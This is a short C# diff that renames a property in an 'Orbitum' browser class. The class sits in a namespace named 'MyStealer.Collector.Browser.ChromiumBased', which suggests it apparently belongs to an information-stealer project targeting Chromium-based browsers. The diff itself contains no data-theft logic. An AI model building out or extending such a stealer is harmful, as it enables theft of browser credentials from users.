@@ -5,7 +5,7 @@ namespace MyStealer.Collector.Browser.ChromiumBased
 {
     public class Orbitum : Chromium
     {
-        public override string ModuleName => "Orbitum";
+        public override string Name => "Orbitum";
 
         public override bool HasProfiles => false;
 
